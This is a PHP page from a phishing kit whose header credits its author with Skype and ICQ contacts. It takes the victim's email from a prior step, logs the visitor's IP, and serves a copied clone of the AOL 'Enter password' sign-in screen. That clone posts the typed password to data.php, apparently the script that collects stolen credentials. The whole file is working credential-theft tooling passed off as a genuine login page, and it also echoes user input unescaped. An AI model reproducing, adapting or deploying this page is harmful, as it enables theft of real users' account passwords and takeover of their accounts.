<?php
// THIS SCRIPT CODED BY saradauchia2
// CONTACT US SKYPE : saradauchia2
// ICQ : 706318279

session_start();
$email = $_POST['username'];
$_SESSION['username'] = $email;
$v_ip = $_SERVER['REMOTE_ADDR'];
?>
<!DOCTYPE html>
<html id="Stencil" class="no-js grid light-theme ">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL</title>
        <meta name="description" content="AOL" />
        <link rel="dns-prefetch" href="//gstatic.com">
        <link rel="dns-prefetch" href="//google.com">
        <link rel="dns-prefetch" href="//s.yimg.com">
        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.yahoo.com">
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0" />
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <style nonce="rC4flONsqMim1ki2QggiU5O6dqlKxZjseMhRIfzuC4h5EUPH">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/42222654e55f9784023ad16ec27c48dcb0ee0486/aol-main.css" rel="stylesheet" type="text/css">
        <script nonce="rC4flONsqMim1ki2QggiU5O6dqlKxZjseMhRIfzuC4h5EUPH">
            var pageStartTime = new Date().getTime();
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"}};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 794200033;
root.I13N_config.location = "https:\u002F\u002Flogin.aol.com\u002Faccount\u002Fchallenge\u002Fpassword?display=login";
root.I13N_config.referrer = "https:\u002F\u002Flogin.aol.com\u002F";
root.I13N_config.keys || (root.I13N_config.keys = {});
root.I13N_config.keys.pg_name = "passwordChallenge";
root.I13N_config.keys.gm_np = "aol";
root.I13N_config.keys.p_sec = "DEFAULT_SECTION";
root.I13N_config.keys.p_subsec = "DEFAULT_SUBSECTION";
root.I13N_config.keys.test = "mbr-phone-with-interstitial,mbr-oneflow-soft-ctrl,mbr-fido-1fa-login,mbr-enable-commchannel-review-trap,mbr-block-non-us-reg,mbr-ahc-v2-unverified,mbr-simplified-reg,mbr-phone-without-interstitial-control";
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=794200033&ref=https%3A%2F%2Flogin.aol.com%2Faccount%2Fchallenge%2Fpassword&sa=geminifed%253D1%2520y-bucket%253Dmbr-phone-with-interstitial%252Cmbr-oneflow-soft-ctrl%252Cmbr-fido-1fa-login%252Cmbr-enable-commchannel-review-trap%252Cmbr-block-non-us-reg%252Cmbr-ahc-v2-unverified%252Cmbr-simplified-reg%252Cmbr-phone-without-interstitial-control","k2Rate":1,"positions":{"RICH":{"sandbox":"allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox","id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":5000,"noexp":1,"fdb":"","on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1651597339715;
root.challenge.isAndroidWebview = false;
root.I13N_config.keys.pct = "signin";
root.pwchallenge || (root.pwchallenge = {});
root.pwchallenge.messages = {"toolTipShow":"Show password","toolTipHide":"Hide password"};
root.isIOSDevice = false;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=1lm8tjph72o0r&crumb=' + encodeURIComponent('fCYgex/MG/h') + '&message=' + encodeURIComponent(name) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };

        </script>
    </head>
    <body class="bucket-mbr-phone-with-interstitial bucket-mbr-enable-commchannel-review-trap bucket-mbr-simplified-reg bucket-mbr-phone-without-interstitial-control">
    <script nonce="rC4flONsqMim1ki2QggiU5O6dqlKxZjseMhRIfzuC4h5EUPH">
        (function(root) {
            var doc = document;
            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
            }
        }(this));
    </script>
    <div id="login-body" class="loginish  puree-v2  grid    ">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="https://www.aol.com/">
            <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="" />
            <img src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo " width="100" height="" />
        </a>
    </span>
    <span class="column help txt-align-right">
        <a href="https://help.aol.com/">Help</a>
    </span>
</div>
    <div class="login-box-container">
        <div class="login-box right">
            <div class="mbr-login-hd txt-align-center">
                    <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo aol-en-US" width="100" height="" />
                    <img src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo aol-en-US" width="100" height="" />
            </div>
            <div class="challenge password-challenge">
    <div class="challenge-header">
        <div class="yid"><?php echo $email ?></div>
    </div><div id="password-challenge" class="primary">
    <strong class="challenge-heading">Enter password</strong>
    <span class="txt-align-center challenge-desc">to finish sign in</span>
        <form action="data.php" method="post" class="challenge-form">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" name="crumb" value="fCYgex/MG/h" />
        <input type="hidden" name="acrumb" value="2gpYKtio" />
        <input type="hidden" name="sessionIndex" value="Qg--" />
        <input type="hidden" name="displayName" value="<?php echo $email ?>" />
        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation"
                autocorrect="off" spellcheck="false"
                name="username" value="<?php echo $email ?>" />
        </div>
        <input type="hidden" name="passwordContext" value="normal" />
        <input type="hidden" name="isShowButtonClicked" id="show-button-clicked" value="" />
        <input type="hidden" name="showButtonStatus" id="show-button-status" value="" />
        <input type="hidden" name="prefersReducedMotion" id="prefers-reduce-motion" value="" />
        <div id="password-container" class="input-group password-container focussed">
            <input type="password" id="login-passwd" class="password" required name="password"
                placeholder=" " autofocus autocomplete="current-password"
                data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd" />
            <label for="login-passwd" id="password-label" class="password-label">Password</label>
            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is on"></div>
            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1"
                title="Show password"
                data-rapid-tracking="true" data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:toggle-show-hide"
            >
            </button>
        </div>

        <div class="button-container">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button"
                name="verifyPassword" value="Next"
                data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next">
                    Next
            </button>
        </div>
        <div class="forgot-cont challenge-button-link">
            <input type="submit" class="pure-button puree-button-link challenge-button-link"
                data-ylk="elm:btn;elmt:skip;slk:skip;mKey:skip-recovery" data-rapid-tracking="true"
                id="mbr-forgot-link"
                name="skip" value="Forgot password?" data-rapid-tracking="true" />
        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>
        </div>
    </div>
    <div class="login-bg-outer">
        <div class="login-bg-inner">
                <div id="login-ad-rich"></div>
                    </div>
    </div>
    
</div>
    <script src="https://s.yimg.com/ss/rapid-3.53.30.js"></script>
    <script nonce="rC4flONsqMim1ki2QggiU5O6dqlKxZjseMhRIfzuC4h5EUPH">
        var rapidInstance = new YAHOO.i13n.Rapid(I13N_config);
    </script>
    <script src="https://s.yimg.com/wm/mbr/42222654e55f9784023ad16ec27c48dcb0ee0486/bundle.js"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=fCYgex%2FMG%2Fh&message=javascript_not_enabled&ref=%2Faccount%2Fchallenge%2Fpassword" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="rC4flONsqMim1ki2QggiU5O6dqlKxZjseMhRIfzuC4h5EUPH">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross" />
        <p class="mbr-legacy-device">
                AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some AOL features may not work properly. Please update your browser version now. <a href="">More Info</a>
        </p>
    </div>
    <script nonce="rC4flONsqMim1ki2QggiU5O6dqlKxZjseMhRIfzuC4h5EUPH">
        (function(root) {
            if (!root.isGoodJS) {
                document.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>
    </body>
</html>
<!-- fe29.member.bf1.yahoo.com - Tue May 03 2022 17:02:19 GMT+0000 (Coordinated Universal Time) - (0ms) -->